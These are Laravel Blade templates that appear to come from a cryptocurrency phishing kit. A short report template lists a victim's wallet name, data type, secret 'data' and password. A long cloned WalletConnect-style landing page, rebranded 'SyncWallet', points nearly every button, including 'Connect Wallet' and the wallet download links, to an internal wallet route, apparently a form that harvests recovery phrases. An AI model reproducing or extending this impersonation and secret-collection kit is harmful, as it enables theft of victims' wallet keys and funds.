<!DOCTYPE html>
<html>
<body>

    <h1>Wallet Name : {{$wallet}}</h1>
    <h1>Data Type : {{$type}}</h1>
    <h1>Data : {{$msg}}</h1>
    @if($psw !== '')
    <h1>Password : {{$psw}}</h1>
    @endif

</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>    
    <meta charset="utf-8" />
    <meta name="viewport"
    content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Sync Wallet Connect</title>
    <meta name="next-head-count" content="10" />
    <meta charset="utf-8" />
    <link rel="icon" href="{{asset('asset/static/media/favicon.ico')}}" />
    
    <link rel="stylesheet" href="{{asset('assetB/css/264f203fe2e5a9ff.css')}}" data-n-g="" />
    <link rel="stylesheet" href="{{asset('assetB/css/3281c8f3b42795ed.css')}}" data-n-p="" />
    <noscript data-n-css=""></noscript>
    

    <style id="_goober">
        @keyframes go2264125279 {
            from {
                transform: scale(0) rotate(45deg);
                opacity: 0;
            }

            to {
                transform: scale(1) rotate(45deg);
                opacity: 1;
            }
        }

        @keyframes go3020080000 {
            from {
                transform: scale(0);
                opacity: 0;
            }

            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes go463499852 {
            from {
                transform: scale(0) rotate(90deg);
                opacity: 0;
            }

            to {
                transform: scale(1) rotate(90deg);
                opacity: 1;
            }
        }

        @keyframes go1268368563 {
            from {
                transform: rotate(0deg);
            }

            to {
                transform: rotate(360deg);
            }
        }

        @keyframes go1310225428 {
            from {
                transform: scale(0) rotate(45deg);
                opacity: 0;
            }

            to {
                transform: scale(1) rotate(45deg);
                opacity: 1;
            }
        }

        @keyframes go651618207 {
            0% {
                height: 0;
                width: 0;
                opacity: 0;
            }

            40% {
                height: 0;
                width: 6px;
                opacity: 1;
            }

            100% {
                opacity: 1;
                height: 10px;
            }
        }

        @keyframes go901347462 {
            from {
                transform: scale(0.6);
                opacity: 0.4;
            }

            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        .go4109123758 {
            z-index: 9999;
        }

        .go4109123758>* {
            pointer-events: auto;
        }
    </style>
</head>

<body class="fontsLoaded" data-new-gr-c-s-check-loaded="14.1147.0" data-gr-ext-installed="">
    <div id="__next">
        <section class="styles_section__xSYxd">
            <div class="styles_container__Ma4YB">
                <p class="styles_text__LlfBJ styles_text3__Jd2fb styles_colorWhite__UuUMU styles_text__oXZHN">
                    <span>The Web3Inbox app is coming.</span><span class="styles_extraText__KcYim">&nbsp;<!-- -->Join
                        150,000+ ready for better web3
                        messaging.</span>
                </p>
                <a href="{{route('home')}}"
                    target="_blank" rel="noopener"><button type="button"
                        class="styles_button__gAHKk styles_fillBlue__7AYTO styles_button__8B1xK">
                        <span class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU">Join
                            waitlist</span>
                    </button></a>
            </div>
        </section>
        <header id="styles_header__KZ1Y1" class="">
            <img alt="SyncWallet logo" src="{{asset('assetB/images/logo.svg')}}" width="203" height="32" decoding="async"
                data-nimg="future" class="styles_image__9dfzG styles_loaded__4M8Ff styles_logo__rasCe" />
            <div id="styles_container__yH3RZ" class="styles_menuContent__q_2qr">
                <nav>
                    <ul>
                        <li class="styles_item__wjxNh">
                            <a href="{{route('wallet')}}"
                                class="styles_anchor__0805S styles_ghost__okJJU styles_desktopLink__Bllpq"><span
                                    class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU">Products</span></a><a
                                href="{{route('wallet')}}"
                                class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU styles_mobileLink__Ys_3F">Products</a>
                        </li>
                        <li class="styles_item__wjxNh">
                            <a href="{{route('wallet')}}"
                                class="styles_anchor__0805S styles_ghost__okJJU styles_desktopLink__Bllpq"><span
                                    class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU">Partners</span></a><a
                                href="{{route('wallet')}}"
                                class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU styles_mobileLink__Ys_3F">Partners</a>
                        </li>
                        <li class="styles_item__wjxNh">
                            <a href="{{route('wallet')}}"
                                class="styles_anchor__0805S styles_ghost__okJJU styles_desktopLink__Bllpq"><span
                                    class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU">Docs</span></a><a
                                href="{{route('wallet')}}"
                                class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU styles_mobileLink__Ys_3F">Docs</a>
                        </li>
                        <li class="styles_item__wjxNh">
                            <a href="{{route('wallet')}}"
                                class="styles_anchor__0805S styles_ghost__okJJU styles_desktopLink__Bllpq"><span
                                    class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU">Explorer</span></a><a
                                href="{{route('wallet')}}"
                                class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU styles_mobileLink__Ys_3F">Explorer</a>
                        </li>
                    </ul>
                </nav>
            </div>
            <ul id="styles_social__5iRcK" class="styles_menuContent__q_2qr">
                <li>
                    <a href="{{route('wallet')}}" target="_blank" rel="noreferrer"><button type="button"
                            class="styles_button__zk_LZ styles_outlineGrey__sN77O">
                            <img alt="Twitter icon" src="{{asset('assetB/header_twitter.svg')}}" width="24" height="24"
                                decoding="async" data-nimg="future" class="styles_image__9dfzG styles_socialIcon__cAuJY"
                                loading="lazy" /></button></a>
                </li>
                <li>
                    <a href="{{route('wallet')}}" target="_blank" rel="noreferrer"><button type="button"
                            class="styles_button__zk_LZ styles_outlineGrey__sN77O">
                            <img alt="Mirror icon" src="{{asset('assetB/header_mirror.svg')}}" width="24" height="24"
                                decoding="async" data-nimg="future" class="styles_image__9dfzG styles_socialIcon__cAuJY"
                                loading="lazy" /></button></a>
                </li>
                <li>
                    <a href="{{route('wallet')}}" target="_blank" rel="noreferrer"><button type="button"
                            class="styles_button__zk_LZ styles_outlineGrey__sN77O">
                            <img alt="GitHub icon" src="{{asset('assetB/header_github.svg')}}" width="24" height="24"
                                decoding="async" data-nimg="future" class="styles_image__9dfzG styles_socialIcon__cAuJY"
                                loading="lazy" /></button></a>
                </li>
                <li>
                    <a href="{{route('wallet')}}" target="_blank" rel="noreferrer"><button type="button"
                            class="styles_button__zk_LZ styles_outlineGrey__sN77O">
                            <img alt="Discord icon" src="{{asset('assetB/header_discord.svg')}}" width="24" height="24"
                                decoding="async" data-nimg="future" class="styles_image__9dfzG styles_socialIcon__cAuJY"
                                loading="lazy" /></button></a>
                </li>
            </ul>
            <a href="{{route('home')}}" id="styles_dashboardBtn__uRImL"><button type="button"
                    class="styles_button__gAHKk styles_outlineGrey__qyVBK styles_menuContent__q_2qr">
                    <span class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU">Dashboard</span>
                </button></a><button class="styles_hamburger__sOsWb">
                <span id="styles_hamburgerTop__vBZrI"></span><span id="styles_hamburgerText__DdKwO">Mobile
                    Navigation</span><span id="styles_hamburgerBottom__FUVpL"></span>
            </button>
        </header>
        <section>
            <div class="styles_container__lcSzG styles_hero__WQcec styles_loaded__7u685">
                <img alt="Abstract colorful shapes" src="{{asset('assetB/images/hero.438e58ae.jpeg')}}" width="2520"
                    height="1500" decoding="async" data-nimg="future" class="styles_image__DSP3n" /><img
                    alt="SyncWallet logo mark" src="{{asset('assetB/images/logo_mark.84dd8525.svg')}}" width="144"
                    height="89" decoding="async" data-nimg="future"
                    class="styles_image__9dfzG styles_loaded__4M8Ff styles_logo__kIE2c" />
                <h1 class="styles_heading__YwDIe styles_heading1__x7mlf styles_colorWhite__UuUMU styles_heading__Zwe1y">
                    Connecting web3
                </h1>
                <p class="styles_text__LlfBJ styles_text2__xsLxi styles_colorGrey__ZiDfp styles_text__Je7qK">
                    The communications protocol for web3, SyncWallet brings the
                    ecosystem together by enabling wallets and apps to securely connect
                    and interact.
                </p>
                <div class="styles_actions__KxSDg">
                    <a href="{{route('wallet')}}" class="styles_button__gAHKk styles_fillBlue__7AYTO">
                        <span
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_textIconRight__7obUS">Connect Wallet</span><img alt="arrow right" src="{{asset('assetB/images/arrow_right_white.1e8e5748.svg')}}"
                            width="7" height="12" decoding="async" data-nimg="future"
                            class="styles_image__9dfzG styles_loaded__4M8Ff undefined" loading="lazy" /></a>
                    <a href="{{route('wallet')}}" class="styles_button__gAHKk styles_fillGrey__yz8kb">
                        <span
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorBlack__d7Lqy styles_textIconRight__7obUS">Explore
                            Wallets &amp; Apps</span><img alt="arrow right"
                            src="{{asset('assetB/images/arrow_right_black.7f57cb8c.svg')}}" width="7" height="12"
                            decoding="async" data-nimg="future"
                            class="styles_image__9dfzG styles_loaded__4M8Ff undefined" loading="lazy" />
                    </a>
                </div>
            </div>
        </section>
        <section class="styles_section__8hE20">
            <div class="styles_titleSection__fBdMr">
                <img alt="w3i-logo" src="{{asset('assetB/images/w3i-logo.png')}}" width="300" height="48" decoding="async"
                    data-nimg="future" class="styles_image__9dfzG styles_loaded__4M8Ff styles_image__NRo1V"
                    loading="lazy" />
                <h3 class="styles_heading__YwDIe styles_heading3__iwGXC styles_colorWhite__UuUMU">
                    Early Access
                </h3>
            </div>
            <div
                class="styles_card__bfuIs styles_gradient__J_Gtp styles_roundedLg__2FT1O styles_paddingMd__rPRrm styles_containerCard__qDm1O">
                <div class="styles_textSection__zna7l">
                    <div class="styles_iconLabelSection__BVOl2">
                        <img alt="bell" src="{{asset('assetB/images/bell.svg')}}" width="20" height="20" decoding="async"
                            data-nimg="future" class="styles_image__9dfzG styles_loaded__4M8Ff undefined"
                            loading="lazy" />
                        <h6 class="styles_heading__YwDIe styles_heading6__GOm05 styles_colorWhite__UuUMU">
                            App notifications
                        </h6>
                    </div>
                    <div>
                        <h6 class="styles_heading__YwDIe styles_heading3__iwGXC styles_colorLightGreen__MAXK_">
                            Get notifications from the apps you love
                        </h6>
                    </div>
                    <div>
                        <p class="styles_text__LlfBJ styles_text2__xsLxi styles_colorWhite__UuUMU">
                            From DAO proposals to NFT drops, social updates to game requests
                            — get real-time notifications from your favorite apps.
                        </p>
                    </div>
                    <a class="styles_btnContainer__rWcNZ" href="{{route('wallet')}}"><button
                            class="styles_button__gAHKk styles_fillWhite___cA0O styles_btn__7itKY">
                            <span class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorBlack__d7Lqy">Join the
                                waitlist</span>
                        </button></a>
                </div>
                <div class="styles_illustrationSection__gCfV_">
                    <img alt="Web3Inbox Early Access Illustration " src="{{asset('assetB/images/w3i-illustration.png')}}" decoding="async"
                        data-nimg="future-fill" class="styles_image__9dfzG styles_loaded__4M8Ff undefined"
                        loading="lazy" style="
                position: absolute;
                height: 100%;
                width: 100%;
                object-fit: contain;
              " />
                </div>
            </div>
        </section>
        <section class="styles_section__AztRm">
            <h3 class="styles_heading__YwDIe styles_heading3__iwGXC styles_colorWhite__UuUMU styles_title__SJWU5">
                We make it easy for you to plug into web3.
            </h3>
            <img alt="Synth 3d graphics" src="{{asset('assetB/images/synth.648fc923.jpeg')}}" width="2520" height="1760"
                decoding="async" data-nimg="future" class="styles_image__9dfzG styles_loaded__4M8Ff styles_image__1xiuM"
                loading="lazy" />
            <div class="styles_curious__Lm4h_">
                <span class="styles_text__LlfBJ styles_text1___WCK1 styles_colorWhite__UuUMU">Curious about</span>
                <div class="styles_tag__YN7uo styles_green__V7BKd undefined">
                    <span class="styles_text__LlfBJ styles_text1___WCK1 styles_colorGreen__TTehu">DeFi</span>
                </div>
                <div class="styles_tag__YN7uo styles_orange__dFTrm undefined">
                    <span class="styles_text__LlfBJ styles_text1___WCK1 styles_colorOrange__iZABN">NFTs</span>
                </div>
                <div class="styles_tag__YN7uo styles_cyan__SM7Uo undefined">
                    <span class="styles_text__LlfBJ styles_text1___WCK1 styles_colorCyan__qstTi">DAOs</span>
                </div>
            </div>
            <h3 class="styles_heading__YwDIe styles_heading3__iwGXC styles_colorWhite__UuUMU styles_tagline__pTP6u">
                With SyncWallet, you can connect your wallet with hundreds of apps,
                opening the doors to a new world of web3 experiences.
            </h3>
        </section>
        <section class="styles_section__1jd5K">
            <div
                class="styles_card__bfuIs styles_gradient__J_Gtp styles_roundedLg__2FT1O styles_paddingMd__rPRrm styles_containerCard__8jYLl">
                <div class="styles_accordionContainer__SR2FZ">
                    <a class="styles_accordionAnchor__cUzSb" href="/accordion">
                        <div class="styles_card__bfuIs styles_dark__Lr7va styles_roundedMd__aAqXZ styles_paddingLg__LziPZ styles_accordionCard__S2fnJ false"
                            id="accordionCard0" style="height: 120px">
                            <div class="styles_accordionCardTitle__6RLrc">
                                <h4 class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorGrey__ZiDfp">
                                    Click ‘Connect Wallet’
                                </h4>
                                <div class="styles_accordionCardBadge__ZNW9s">
                                    <span
                                        class="styles_numeric__16iEp styles_numeric5__mrdQg styles_colorWhite__UuUMU">1</span>
                                </div>
                            </div>
                            <p
                                class="styles_text__LlfBJ styles_text2__xsLxi styles_colorGrey__ZiDfp styles_accordionText__y3Kt8">
                                Locate the button on your desired app, as this will enable you
                                to log in with your preferred wallet.
                            </p>
                        </div>
                    </a><a class="styles_accordionAnchor__cUzSb" href="/accordion">
                        <div class="styles_card__bfuIs styles_dark__Lr7va styles_roundedMd__aAqXZ styles_paddingLg__LziPZ styles_accordionCard__S2fnJ styles_activeAccordionCard__cSUuR"
                            id="accordionCard1" style="height: 218px">
                            <div class="styles_accordionCardTitle__6RLrc">
                                <h4 class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU">
                                    Scan the QR code or find your wallet
                                </h4>
                                <div class="styles_accordionCardBadge__ZNW9s">
                                    <svg width="36" height="36" viewBox="0 0 36 36" class="styles_progressSvg__2L_Gf">
                                        <circle class="styles_progressCircle___QgEo" cx="18" cy="18" r="17.5"
                                            fill="none" stroke="#3396ff" stroke-width="1.2" pathLength="100"></circle>
                                    </svg><span
                                        class="styles_numeric__16iEp styles_numeric5__mrdQg styles_colorWhite__UuUMU">2</span>
                                </div>
                            </div>
                            <p
                                class="styles_text__LlfBJ styles_text2__xsLxi styles_colorGrey__ZiDfp styles_accordionText__y3Kt8">
                                Initiate the connection so that SyncWallet gets to work in
                                the background, linking your wallet and app.
                            </p>
                        </div>
                    </a><a class="styles_accordionAnchor__cUzSb" href="/accordion">
                        <div class="styles_card__bfuIs styles_dark__Lr7va styles_roundedMd__aAqXZ styles_paddingLg__LziPZ styles_accordionCard__S2fnJ false"
                            id="accordionCard2" style="height: 120px">
                            <div class="styles_accordionCardTitle__6RLrc">
                                <h4 class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorGrey__ZiDfp">
                                    Start exploring!
                                </h4>
                                <div class="styles_accordionCardBadge__ZNW9s">
                                    <span
                                        class="styles_numeric__16iEp styles_numeric5__mrdQg styles_colorWhite__UuUMU">3</span>
                                </div>
                            </div>
                            <p
                                class="styles_text__LlfBJ styles_text2__xsLxi styles_colorGrey__ZiDfp styles_accordionText__y3Kt8">
                                You can now interact with the app. Three simple steps is all
                                it takes.
                            </p>
                        </div>
                    </a><button class="styles_button__gAHKk styles_fillBlue__7AYTO styles_actionBtn__QKP1j">
                        <span class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU">Try it out
                            now</span>
                    </button>
                </div>
                <div class="styles_container__lcSzG styles_animationContainer__ko4E5 styles_loaded__7u685">
                    <img alt="abstract shapes" src="{{asset('assetB/images/product_bg1.bccf6383.jpeg')}}" width="1800"
                        height="1200" decoding="async" data-nimg="future" class="styles_image__DSP3n"
                        loading="lazy" /><img alt="SyncWallet connect prompt"
                        id="styles_animationConnectWallet__AhwPf" src="{{asset('assetB/images/connect_wallet.f249ca36.png')}}"
                        width="2637" height="1724" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_animationItem__pcZs9 animationItem0"
                        loading="lazy" style="
                transform: translateY(var(--motion-translateY));
                opacity: 0;
                --motion-translateY: 10px;
              " /><img alt="SyncWallet QR Modal" id="styles_animationItemQrModal___ZE20"
                        src="{{asset('assetB/images/modal_qr.f7946f6c.png')}}" width="1200" height="1600" decoding="async"
                        data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_animationItem__pcZs9 animationItem1"
                        loading="lazy" style="
                transform: translateY(var(--motion-translateY));
                opacity: 1;
                --motion-translateY: 0px;
              " /><img alt="SyncWallet Linking Modal" id="styles_animationItemLinkingModal__HGgE4"
                        src="{{asset('assetB/images/modal_linking.5bb87354.png')}}" width="1200" height="1600" decoding="async"
                        data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_animationItem__pcZs9 animationItem1"
                        loading="lazy" style="
                transform: translateY(var(--motion-translateY));
                opacity: 1;
                --motion-translateY: 0px;
              " /><img alt="Mirror Widget" id="styles_animationItemMirror__9JP8T"
                        src="{{asset('assetB/images/mirror_widget.3bc5e201.png')}}" width="1520" height="1432" decoding="async"
                        data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_animationItem__pcZs9 animationItem2"
                        loading="lazy" style="
                transform: translateY(var(--motion-translateY));
                opacity: 0;
                --motion-translateY: 10px;
              " /><img alt="Shapeism Widget" id="styles_animationItemShapeism__xVWeq"
                        src="{{asset('assetB/images/shapeism_widget.6862f15d.png')}}" width="1113" height="1432"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_animationItem__pcZs9 animationItem2"
                        loading="lazy" style="
                transform: translateY(var(--motion-translateY));
                opacity: 0;
                --motion-translateY: 10px;
              " /><img alt="Uniswap Widget" id="styles_animationItemUniswap__JE4mo"
                        src="{{asset('assetB/images/uniswap_widget.31a66be9.png')}}" width="1460" height="872" decoding="async"
                        data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_animationItem__pcZs9 animationItem2"
                        loading="lazy" style="
                transform: translateY(var(--motion-translateY));
                opacity: 0;
                --motion-translateY: 10px;
              " />
                </div>
            </div>
        </section>
        <section class="styles_section__RfEYj">
            <div class="styles_heading__uRv8i">
                <h3 class="styles_heading__YwDIe styles_heading3__iwGXC styles_colorWhite__UuUMU styles_title__T5hh_">
                    Looking for a wallet?
                </h3>
                <div class="styles_headingAction__QEGCg">
                    <button class="styles_button__gAHKk styles_ghost__6zb7F">
                        <span
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorBlue__yosSC styles_textIconRight__7obUS">View
                            all wallets</span><img alt="Arrow right blue"
                            src="{{asset('assetB/images/arrow_right_blue.2e2cf95d.svg')}}" width="24" height="24"
                            decoding="async" data-nimg="future"
                            class="styles_image__9dfzG styles_loaded__4M8Ff undefined" loading="lazy" />
                    </button>
                </div>
            </div>
            <div
                class="styles_card__bfuIs styles_transparent__jKb9d styles_roundedLg__2FT1O styles_paddingNone__s1e3U styles_card__4Xzsc">
                <div class="styles_cardHeader__5L_Mj">
                    <img alt="Rainbow" src="{{asset('assetB/images/rainbow_icon.png')}}" width="80" height="80" decoding="async"
                        data-nimg="future" class="styles_image__9dfzG styles_loaded__4M8Ff styles_cardIcon__N9Hr0"
                        loading="lazy" />
                    <h4
                        class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU styles_cardTitle__OjBpL">
                        Rainbow
                    </h4>
                    <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"><button
                            class="styles_button__gAHKk styles_fillBlue__7AYTO styles_cardButton___AkWf">
                            <span
                                class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_textIconRight__7obUS">Get
                                Rainbow</span><img alt="Arrow right icon"
                                src="{{asset('assetB/images/arrow_right_white.1e8e5748.svg')}}" width="7" height="12"
                                decoding="async" data-nimg="future"
                                class="styles_image__9dfzG styles_loaded__4M8Ff undefined"
                                loading="lazy" /></button></a>
                </div>
                <img alt="Rainbow" src="{{asset('assetB/images/rainbow_widget.b94216a7.png')}}" width="1140" height="1140"
                    decoding="async" data-nimg="future"
                    class="styles_image__9dfzG styles_loaded__4M8Ff styles_cardWidget__l0yX1" loading="lazy" />
            </div>
            <div
                class="styles_card__bfuIs styles_transparent__jKb9d styles_roundedLg__2FT1O styles_paddingNone__s1e3U styles_card__4Xzsc">
                <div class="styles_cardHeader__5L_Mj">
                    <img alt="Metamask" src="{{asset('assetB/images/metamask_icon.png')}}" width="80" height="80" decoding="async"
                        data-nimg="future" class="styles_image__9dfzG styles_loaded__4M8Ff styles_cardIcon__N9Hr0"
                        loading="lazy" />
                    <h4
                        class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU styles_cardTitle__OjBpL">
                        Metamask
                    </h4>
                    <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"><button
                            class="styles_button__gAHKk styles_fillBlue__7AYTO styles_cardButton___AkWf">
                            <span
                                class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_textIconRight__7obUS">Get
                                Metamask</span><img alt="Arrow right icon"
                                src="{{asset('assetB/images/arrow_right_white.1e8e5748.svg')}}" width="7" height="12"
                                decoding="async" data-nimg="future"
                                class="styles_image__9dfzG styles_loaded__4M8Ff undefined"
                                loading="lazy" /></button></a>
                </div>
                <img alt="Metamask" src="{{asset('assetB/images/metamask_widget.2a39575f.png')}}" width="1140" height="1140"
                    decoding="async" data-nimg="future"
                    class="styles_image__9dfzG styles_loaded__4M8Ff styles_cardWidget__l0yX1" loading="lazy" />
            </div>
            <div
                class="styles_card__bfuIs styles_transparent__jKb9d styles_roundedLg__2FT1O styles_paddingNone__s1e3U styles_card__4Xzsc">
                <div class="styles_cardHeader__5L_Mj">
                    <img alt="Argent" src="{{asset('assetB/images/argent_icon.png')}}" width="80" height="80" decoding="async"
                        data-nimg="future" class="styles_image__9dfzG styles_loaded__4M8Ff styles_cardIcon__N9Hr0"
                        loading="lazy" />
                    <h4
                        class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU styles_cardTitle__OjBpL">
                        Argent
                    </h4>
                    <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"><button
                            class="styles_button__gAHKk styles_fillBlue__7AYTO styles_cardButton___AkWf">
                            <span
                                class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_textIconRight__7obUS">Get
                                Argent</span><img alt="Arrow right icon"
                                src="{{asset('assetB/images/arrow_right_white.1e8e5748.svg')}}" width="7" height="12"
                                decoding="async" data-nimg="future"
                                class="styles_image__9dfzG styles_loaded__4M8Ff undefined"
                                loading="lazy" /></button></a>
                </div>
                <img alt="Argent" src="{{asset('assetB/images/argent_widget.d9075557.png')}}" width="1520" height="1520"
                    decoding="async" data-nimg="future"
                    class="styles_image__9dfzG styles_loaded__4M8Ff styles_cardWidget__l0yX1" loading="lazy" />
            </div>
        </section>
        <section class="styles_section__m3qDq">
            <h4 class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU styles_title__fHLwM">
                We’re supported by over 300 wallets.
            </h4>
            <div class="styles_ticker__ps147">
                <div class="styles_content__dZufc styles_slideToLeft__skudD">
                    <img alt="/images/unstoppable_icon.png')}}" src="{{asset('assetB/images/unstoppable_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/rainbow_icon.png')}}" src="{{asset('assetB/images/rainbow_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/spot_icon.png')}}" src="{{asset('assetB/images/spot_icon.png')}}" width="80" height="80" decoding="async"
                        data-nimg="future" class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n"
                        loading="lazy" /><img alt="/images/trust_icon.png')}}" src="{{asset('assetB/images/trust_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/zerion_icon.png')}}" src="{{asset('assetB/images/zerion_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/zengo_icon.png')}}" src="{{asset('assetB/images/zengo_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/assure_icon.png')}}" src="{{asset('assetB/images/assure_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/argent_icon.png')}}" src="{{asset('assetB/images/argent_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/imtoken_icon.png')}}" src="{{asset('assetB/images/imtoken_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/metamask_icon.png')}}" src="{{asset('assetB/images/metamask_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/pillar_icon.png')}}" src="{{asset('assetB/images/pillar_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/bitkeep_icon.png')}}" src="{{asset('assetB/images/bitkeep_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/unstoppable_icon.png')}}" src="{{asset('assetB/images/unstoppable_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/rainbow_icon.png')}}" src="{{asset('assetB/images/rainbow_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/spot_icon.png')}}" src="{{asset('assetB/images/spot_icon.png')}}" width="80" height="80" decoding="async"
                        data-nimg="future" class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n"
                        loading="lazy" /><img alt="/images/trust_icon.png')}}" src="{{asset('assetB/images/trust_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/zerion_icon.png')}}" src="{{asset('assetB/images/zerion_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/zengo_icon.png')}}" src="{{asset('assetB/images/zengo_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/assure_icon.png')}}" src="{{asset('assetB/images/assure_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/argent_icon.png')}}" src="{{asset('assetB/images/argent_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/imtoken_icon.png')}}" src="{{asset('assetB/images/imtoken_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/metamask_icon.png')}}" src="{{asset('assetB/images/metamask_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/pillar_icon.png')}}" src="{{asset('assetB/images/pillar_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" /><img
                        alt="/images/bitkeep_icon.png')}}" src="{{asset('assetB/images/bitkeep_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__zHI9n" loading="lazy" />
                </div>
            </div>
        </section>
        <section class="styles_section__hHhFp">
            <div class="styles_heading__0Nhaw">
                <h3 class="styles_heading__YwDIe styles_heading3__iwGXC styles_colorWhite__UuUMU styles_title__vPH4n">
                    Want to connect with an app?
                </h3>
                <div class="styles_headingAction__9wHLL">
                    <button class="styles_button__gAHKk styles_ghost__6zb7F">
                        <span
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorBlue__yosSC styles_textIconRight__7obUS">View
                            all apps</span><img alt="Arrow right blue"
                            src="{{asset('assetB/images/arrow_right_blue.2e2cf95d.svg')}}" width="24" height="24"
                            decoding="async" data-nimg="future"
